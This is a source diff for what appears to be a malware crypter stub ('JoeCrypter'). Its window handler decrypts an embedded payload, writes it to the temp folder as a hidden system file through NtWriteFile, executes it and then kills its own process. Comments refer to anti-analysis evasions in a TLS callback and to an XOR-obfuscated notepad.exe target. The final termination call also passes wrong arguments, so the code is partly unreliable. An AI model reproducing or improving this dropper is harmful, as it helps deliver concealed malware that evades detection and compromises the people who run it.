@@ -92,6 +92,21 @@ EXTERN_C PIMAGE_TLS_CALLBACK _xl_b = changemealreadyincode;
 //const char g_szClassName[] = "JoeCrypter";
 DWORD rsrc_len = 0;
 
+typedef struct _IO_STATUS_BLOCK
+      {
+         union
+         {
+         NTSTATUS Status;
+         PVOID Pointer;
+         };
+      ULONG_PTR Information;
+} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
+
+typedef VOID (NTAPI *PIO_APC_ROUTINE)(
+  PVOID ApcContext,
+  PIO_STATUS_BLOCK IoStatusBlock,
+  ULONG Reserved);
+
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
     switch(msg)
@@ -100,10 +115,35 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 		{	
          // same as usual, checks are in the TLS callback function set by the main prog  
 		 // having evasions in the TLS callback breaks things. Certain functions rely on the WndProc
-			//lotsofwindowshack
+	     //lotsofwindowshack
 			
+			// going extra low level because why the fuck not?
+			IO_STATUS_BLOCK blck;
+			typedef NTSTATUS (*_NtWriteFile)(
+			HANDLE           FileHandle,
+			HANDLE           Event,
+			PIO_APC_ROUTINE  ApcRoutine,
+			PVOID            ApcContext,
+			PIO_STATUS_BLOCK IoStatusBlock,
+			PVOID            Buffer,
+			ULONG            Length,
+			PLARGE_INTEGER   ByteOffset,
+			PULONG           Key);
+
+			_NtWriteFile NtWriteFile = (_NtWriteFile)GetProcAddress(LoadLibrary("ntdll.dll"), "NtWriteFile");
 			byte *payload = decrypted(GetPayload(),rsrc_len, cryptokey);
-			ExecFile(decrypted("f?YYrlkajrvYYv|vq`h67YYkjq`uda+`}`",34,5),payload); // xor'd by 5 from c:\\windows\\system32\\notepad.exe
+			char tempspace[512] = "";
+			char filename[1024] = "";
+			DWORD byteswritten = 0;
+			GetTempPathA(512,tempspace);
+			sprintf(filename,"%s imanexechangemealready",tempspace); // string replace for a random exe name in C# prog
+			HANDLE tmphnd =  CreateFile(filename,GENERIC_ALL, 0, NULL, CREATE_ALWAYS,	FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,	NULL);
+			NtWriteFile(tmphnd,NULL,NULL,NULL,&blck,payload,rsrc_len,NULL,NULL);
+			
+			CloseHandle(tmphnd);
+			// CreateFile, WriteFile, then SetFileAttributes to hidden and system followed by shellexec or createprocess
+			WinExec(filename,0);
+			TerminateProcess(GetProcessId(),1);
 		}
 		break;
         case WM_CLOSE:
